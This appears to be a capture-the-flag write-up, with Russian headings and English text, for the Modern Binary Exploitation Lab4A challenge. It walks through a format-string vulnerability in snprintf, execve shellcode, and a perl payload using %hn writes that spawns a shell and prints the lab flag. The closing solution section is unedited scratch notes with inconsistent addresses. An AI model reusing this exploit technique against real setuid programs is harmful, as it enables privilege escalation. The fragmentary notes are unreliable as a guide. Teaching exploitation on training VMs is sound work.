---
title: "Разбор Lab4A (сложно)"
permalink: /writeups/mbe/lab4a/
excerpt: "Разбор Lab4A."
---

---
Finally, the last level of the format strings challenges. First, log into the Lab04 as **lab4A** (`lab4A:fg3ts_d0e5n7_m4k3_y0u_1nv1nc1bl3`) and go to the challenges folder:

```shell
$ ssh lab4A@<VM_IP>
$ cd /levels/lab04/
```

Let's execute the program:

```shell
lab4A@warzone:/levels/lab04$ ./lab4A
Usage: ./lab4A filename
ERROR: Failed to open ./backups/.log
```

Hum, we will need to check the code to know how this program works.

## Анализ исходного кода

Let's analyze the source code.

```c
#include <stdio.h>
#include <stdlib.h>
#include <string.h>
#include <sys/types.h>
#include <sys/stat.h>
#include <fcntl.h>
#include <unistd.h>

#define BACKUP_DIR "./backups/"
#define LOG_FILE "./backups/.log"

void log_wrapper(FILE *logf, char *msg, char *filename)
{
    char log_buf[255];
    strcpy(log_buf, msg);
    snprintf(log_buf+strlen(log_buf), 255-strlen(log_buf)-1/*NULL*/, filename);
    log_buf[strcspn(log_buf, "\n")] = '\0';
    fprintf(logf, "LOG: %s\n", log_buf);
}

int main(int argc, char *argv[])
{
    char ch = EOF;
    char dest_buf[100];
    FILE *source, *logf;
    int target = -1;

    if (argc != 2) {
        printf("Usage: %s filename\n", argv[0]);
    }

    // Open log file
    logf = fopen(LOG_FILE, "w");
    if (logf == NULL) {
        printf("ERROR: Failed to open %s\n", LOG_FILE);
        exit(EXIT_FAILURE);
    }

    log_wrapper(logf, "Starting back up: ", argv[1]);

    // Open source
    source = fopen(argv[1], "r");
    if (source == NULL) {
        printf("ERROR: Failed to open %s\n", argv[1]);
        exit(EXIT_FAILURE);
    }

    // Open dest
    strcpy(dest_buf, BACKUP_DIR);
    strncat(dest_buf, argv[1], 100-strlen(dest_buf)-1/*NULL*/);
    target = open(dest_buf, O_CREAT | O_EXCL | O_WRONLY, S_IRUSR | S_IWUSR);
    if (target < 0) {
        printf("ERROR: Failed to open %s%s\n", BACKUP_DIR, argv[1]);
        exit(EXIT_FAILURE);
    }

    // Copy data
    while( ( ch = fgetc(source) ) != EOF)
        write(target, &ch, 1);

    log_wrapper(logf, "Finished back up ", argv[1]);

    // Clean up
    fclose(source);
    close(target);

    return EXIT_SUCCESS;
}.
```

The code seems to be a bit complicated but it is not! First, these line are interesting:

```c
#define BACKUP_DIR "./backups/"
#define LOG_FILE "./backups/.log"
```

While we cannot create file or folder in */levels/lab04*, given `BACKUP_DIR` and `LOG_FILE` are relative path, we should be able to do something from the */tmp* folder.

```shell
lab4A@warzone:/levels/lab04$ cd /tmp/
lab4A@warzone:/tmp$ mkdir backups
lab4A@warzone:/tmp$ /levels/lab04/lab4A test
ERROR: Failed to open test
lab4A@warzone:/tmp$ cat backups/.log
LOG: Starting back up: test
```

We do have something in the **.log** file, but we still have an error. Why? Well check this code:

```c
logf = fopen(LOG_FILE, "w");
    if (logf == NULL) {
        printf("ERROR: Failed to open %s\n", LOG_FILE);
        exit(EXIT_FAILURE);
    }

    log_wrapper(logf, "Starting back up: ", argv[1]);
```

Here, the `fopen()` function call will be sucessful given we do have a *./backups* folder now. Then, the *log_wrapper()* function is called and will write **LOG: Starting back up: test** in the *.log* file.

```c
void log_wrapper(FILE *logf, char *msg, char *filename)
{
    char log_buf[255];
    strcpy(log_buf, msg);
    snprintf(log_buf+strlen(log_buf), 255-strlen(log_buf)-1/*NULL*/, filename);
    log_buf[strcspn(log_buf, "\n")] = '\0';
    fprintf(logf, "LOG: %s\n", log_buf);
}
```

However, the *test* file does not exists so, we have an error. But if you take a closer look to the `log_wrapper()` function, there is an issue:
- `snprintf(log_buf+strlen(log_buf), 255-strlen(log_buf)-1, filename);`

Check the [snprintf](https://cplusplus.com/reference/cstdio/snprintf/) prototype:

```c
int snprintf ( char * s, size_t n, const char * format, ... );
```

Here, the **filename** is our argument which we control! It means that if we specify a filename containing format specifiers, we should be able to get control of the stack!

```shell
lab4A@warzone:/tmp$ /levels/lab04/lab4A test.%8x.%8x.%8x.%8x.%8x
ERROR: Failed to open test.%8x.%8x.%8x.%8x.%8x
lab4A@warzone:/tmp$ cat backups/.log
LOG: Starting back up: test.b7e9eb73.b7e9548c.bffff822. 8048cda. 804b008
```

Okay, we are almost ready to start our dynamic analysis `gdb`, there is one last thing important here:

```nasm
gdb-peda$ checksec
CANARY    : ENABLED
FORTIFY   : disabled
NX        : disabled
PIE       : disabled
RELRO     : FULL
```

**RELRO** (Relocation Read-Only) is enabled and protects the Global Offset Table (GOT) in ELF binaries from being overwritten. It means that we won't be able to rewrite any address in this section (unlike the previous level).

## Динамический анализ

Like in the previous level, we need to find where our argument is located on the stack. Remember that we need this information to be able to specify the memory locations we want to write into. So, if we specify an address as argument, we need to tell our format specifier (`%<argnum>$n`) where is this address on the stack; is it the first one? the second one? etc.

```shell
lab4A@warzone:/tmp$ /levels/lab04/lab4A AAAABBBBCCCC.%8x.%8x.%8x.%8x.%8x.%8x.%8x.%8x.%8x.%8x.%8x.%8x.%8x.%8x.%8x.%8x
ERROR: Failed to open AAAABBBBCCCC.%8x.%8x.%8x.%8x.%8x.%8x.%8x.%8x.%8x.%8x.%8x.%8x.%8x.%8x.%8x.%8x
lab4A@warzone:/tmp$ cat backups/.log
LOG: Starting back up: AAAABBBBCCCC.b7e9eb73.b7e9548c.bffff7ee. 8048cda. 804b008.       0.       0.b7e24994.617453c8.6e697472.61622067.75206b63.41203a70.42414141.43424242.2e434343
```

As you can see, we have the **0x41** values in the 13th and 14th elements. Given we need to align our values, we just need to prepend 1 byte to our payload.

**Заметка** As you may know, the **$** (dollar sing) in *bash* is used for variable substitution, you will need to escape it with a backslash(**\\**) in your payload to avoid any issue.
{: .notice--info}

```shell
lab4A@warzone:/tmp$ /levels/lab04/lab4A DAAAABBBBCCCC.%14\$p.%15\$p.%16\$p
ERROR: Failed to open DAAAABBBBCCCC.%14$p.%15$p.%16$p
lab4A@warzone:/tmp$ cat backups/.log
LOG: Starting back up: DAAAABBBBCCCC.0x41414141.0x42424242.0x43434343
```

Nice, so our arguments will start at the **14th** element. What's next? Well, given the vulnerability happens in the *log_wrapper()* function we could do somthing like this:
- Find the return address to *main()* from *log_wrapper()*
- Overwrite this return address with the begining of our NOP-sled

Finding the return address to *main()* is easy, we just need to set a breakpoint on the `ret` instruction at the end of the *log_wrapper()* function.

```nasm
gdb-peda$ break *log_wrapper+226
Breakpoint 1 at 0x80489df
gdb-peda$ run `python -c 'print 8 * "A" + 50 * "\x90"'`
Starting program: /levels/lab04/lab4A `python -c 'print 8 * "A" + 50 * "\x90"'`
[----------------------------------registers-----------------------------------]
EAX: 0x0
EBX: 0xb7fcd000 --> 0x1a9da8
ECX: 0x0
EDX: 0x804b0a0 --> 0x0
ESI: 0x0
EDI: 0x0
EBP: 0xbffff688 --> 0x0
ESP: 0xbffff5ec --> 0x8048a8b (<main+171>:	mov    eax,DWORD PTR [esp+0xc])
EIP: 0x80489df (<log_wrapper+226>:	ret)
EFLAGS: 0x286 (carry PARITY adjust zero SIGN trap INTERRUPT direction overflow)
[-------------------------------------code-------------------------------------]
   0x80489d7 <log_wrapper+218>:	add    esp,0x134
   0x80489dd <log_wrapper+224>:	pop    ebx
   0x80489de <log_wrapper+225>:	pop    ebp
=> 0x80489df <log_wrapper+226>:	ret
   0x80489e0 <main>:	push   ebp
   0x80489e1 <main+1>:	mov    ebp,esp
   0x80489e3 <main+3>:	and    esp,0xfffffff0
   0x80489e6 <main+6>:	sub    esp,0x90
[------------------------------------stack-------------------------------------]
0000| 0xbffff5ec --> 0x8048a8b (<main+171>:	mov    eax,DWORD PTR [esp+0xc])
0004| 0xbffff5f0 --> 0x804b008 --> 0xfbad2c84
0008| 0xbffff5f4 --> 0x8048cda ("Starting back up: ")
0012| 0xbffff5f8 --> 0xbffff86a ("AAAAAAAA", '\220' <repeats 50 times>)
0016| 0xbffff5fc --> 0xbffff724 --> 0xbffff856 ("/levels/lab04/lab4A")
0020| 0xbffff600 --> 0x3
0024| 0xbffff604 --> 0x9 ('\t')
0028| 0xbffff608 --> 0xffc0003f
[------------------------------------------------------------------------------]
Legend: code, data, rodata, value

Breakpoint 1, 0x080489df in log_wrapper ()
```

The **ESP** register equals to `0xbffff5ec` which point to the *main()* function (`0x08048a8b`). Now, concerning the address of our buffer, as it will be passed as an argument to *snprinf()*, we can set another breakpoint in *log_wrapper()* and check the stack.

```nasm
gdb-peda$ break *log_wrapper+134
Breakpoint 2 at 0x8048983
gdb-peda$ run `python -c 'print 8 * "A" + 50 * "\x90"'`
Starting program: /levels/lab04/lab4A `python -c 'print 8 * "A" + 50 * "\x90"'`
[----------------------------------registers-----------------------------------]
EAX: 0xbffff86a ("AAAAAAAA", '\220' <repeats 50 times>)
EBX: 0xec
ECX: 0x1d
EDX: 0xbffff4ef --> 0x4b00800
ESI: 0x0
EDI: 0x0
EBP: 0xbffff5e8 --> 0xbffff688 --> 0x0
ESP: 0xbffff4b0 --> 0xbffff4ef --> 0x4b00800
EIP: 0x8048983 (<log_wrapper+134>:	call   0x80487c0 <snprintf@plt>)
EFLAGS: 0x282 (carry parity adjust zero SIGN trap INTERRUPT direction overflow)
[-------------------------------------code-------------------------------------]
   0x8048978 <log_wrapper+123>:	mov    DWORD PTR [esp+0x8],eax
   0x804897c <log_wrapper+127>:	mov    DWORD PTR [esp+0x4],ebx
   0x8048980 <log_wrapper+131>:	mov    DWORD PTR [esp],edx
=> 0x8048983 <log_wrapper+134>:	call   0x80487c0 <snprintf@plt>
   0x8048988 <log_wrapper+139>:	mov    DWORD PTR [esp+0x4],0x8048c90
   0x8048990 <log_wrapper+147>:	lea    eax,[ebp-0x10b]
   0x8048996 <log_wrapper+153>:	mov    DWORD PTR [esp],eax
   0x8048999 <log_wrapper+156>:	call   0x8048700 <strcspn@plt>
Guessed arguments:
arg[0]: 0xbffff4ef --> 0x4b00800
arg[1]: 0xec
arg[2]: 0xbffff86a ("AAAAAAAA", '\220' <repeats 50 times>)
[------------------------------------stack-------------------------------------]
0000| 0xbffff4b0 --> 0xbffff4ef --> 0x4b00800
0004| 0xbffff4b4 --> 0xec
0008| 0xbffff4b8 --> 0xbffff86a ("AAAAAAAA", '\220' <repeats 50 times>)
0012| 0xbffff4bc --> 0xb7e9eb73 (<__GI_strstr+19>:	add    ebx,0x12e48d)
0016| 0xbffff4c0 --> 0xb7e9548c (<malloc_init_state+12>:	add    ebx,0x137b74)
0020| 0xbffff4c4 --> 0xbffff86a ("AAAAAAAA", '\220' <repeats 50 times>)
0024| 0xbffff4c8 --> 0x8048cda ("Starting back up: ")
0028| 0xbffff4cc --> 0x804b008 --> 0xfbad2484
[------------------------------------------------------------------------------]
Legend: code, data, rodata, value

Breakpoint 2, 0x08048983 in log_wrapper ()
```

Our buffer will be stored at `0xbffff4ef`. Well, we have everything we need to exploit this vulnerability:
- The return address `0xbffff5ec`
- Our buffer address `0xbffff4ef`

Let's switch to the shellcode.

## Shellcode

For the shellcode, we will reuse the following one as it is quite short (23 bytes):

```nasm
global _start
_start:

xor    eax, eax ; EAX = 0
push   eax ; push our null byte on the stack to end the string
; push "/bin//sh" in reverse order
push   0x68732f2f ; "hs//"
push   0x6e69622f ; "nib/"

; execve("/bin//sh/", 0, 0);
mov    ebx, esp ; EBX = ptr to "/bin//sh"
mov    ecx, eax ; ECX = 0
mov    edx, eax ; EDX = 0
mov    al, 0xb ; sys_execve()
int    0x80
```

**Заметка** The *Warzone* VM doesn't have **NASM** installed, so I did the development on another Linux VM.
{: .notice--info}

```shell
$ nano shellcode.asm
$ nasm -f elf32 shellcode.asm
```

Then, we can check the code and generate the shellcode.

```shell
$ objdump -M intel -d shellcode.o

shellcode.o:     file format elf32-i386

Disassembly of section .text:

00000000 <_start>:
   0:   31 c0                   xor    eax,eax
   2:   50                      push   eax
   3:   68 2f 2f 73 68          push   0x68732f2f
   8:   68 2f 62 69 6e          push   0x6e69622f
   d:   89 e3                   mov    ebx,esp
   f:   89 c1                   mov    ecx,eax
  11:   89 c2                   mov    edx,eax
  13:   b0 0b                   mov    al,0xb
  15:   cd 80                   int    0x80
```

We get the following result:
- `\x31\xc0\x50\x68\x2f\x2f\x73\x68\x68\x2f\x62\x69\x6e\x89\xe3\x89\xc1\x89\xc2\xb0\x0b\xcd\x80`


Now, we have two choices, either we put the shellcode before the address rewrite (which means we will need to modify our argument selector) or after (which means we need to modify the buffer address).

Let's build a quick proof of concept to guestimate where our shellcode would be in memory.


[return address of main() on the stack][magic sauce to rewrite the ret_address][NOP + Shellcode]

## Решение

b *log_wrapper+134
b *main+166

r < <(python -c "print 'AAAA'")

exploit = "AAAA"

fd = open("/tmp/exploit2", 'w')
fd.write(exploit)
fd.close()

"\x31\xc9\xf7\xe1\x51\x68\x2f\x2f\x73\x68\x68\x2f\x62\x69\x6e\x89\xe3\xb0\x0b\xcd\x80"

RA = 0xbffff5bc
0xbffff520
z = 132
0xbfff - size
0xf520 - 0xbfff - size - 6



run $(perl -e 'print "A" . "\xbc\xf5\xff\xbf" . "\xbe\xf5\xff\xbf" . "\x90"x100 . "\x31\xc9\xf7\xe1\x51\x68\x2f\x2f\x73\x68\x68\x2f\x62\x69\x6e\x89\xe3\xb0\x0b\xcd\x80" . "%62622x" .  "%14\$hn" . "%51935x" . "%15\$hn"')





0xbffff688
lab4A@warzone:/levels/lab04$ gdb /tmp/find
Reading symbols from /tmp/find...(no debugging symbols found)...done.
gdb-peda$ run
Starting program: /tmp/find 
0xbffff6e8

run $(perl -e 'print "A" . "\xac\xf6\xff\xbf" . "\xae\xf6\xff\xbf" . "\x90"x100 . "\x31\xc9\xf7\xe1\x51\x68\x2f\x2f\x73\x68\x68\x2f\x62\x69\x6e\x89\xe3\xb0\x0b\xcd\x80" . "%63678x" .  "%14\$hn" . "%50879x" . "%15\$hn"')

   0x08048a86 <+166>:	call   0x80488fd <log_wrapper>

0xbffff6ac:	0x08048a8b

0xbffff940

```shell
perl -e 'print "A" . "\xac\xf6\xff\xbf" . "\xae\xf6\xff\xbf" . "\x90"x100 . "\x31\xc9\xf7\xe1\x51\x68\x2f\x2f\x73\x68\x68\x2f\x62\x69\x6e\x89\xe3\xb0\x0b\xcd\x80" . "%63678x" .  "%14\$hn" . "%50879x" . "%15\$hn"' > exploit
lab4A@warzone:/tmp$ fixenv /levels/lab04/lab4A `cat exploit`
$ whoami
lab4end
$ cat /home/lab4A/.pass
cat: /home/lab4A/.pass: Permission denied
$ cat /home/lab4end/.pass
1t_w4s_ju5t_4_w4rn1ng
$ 
```
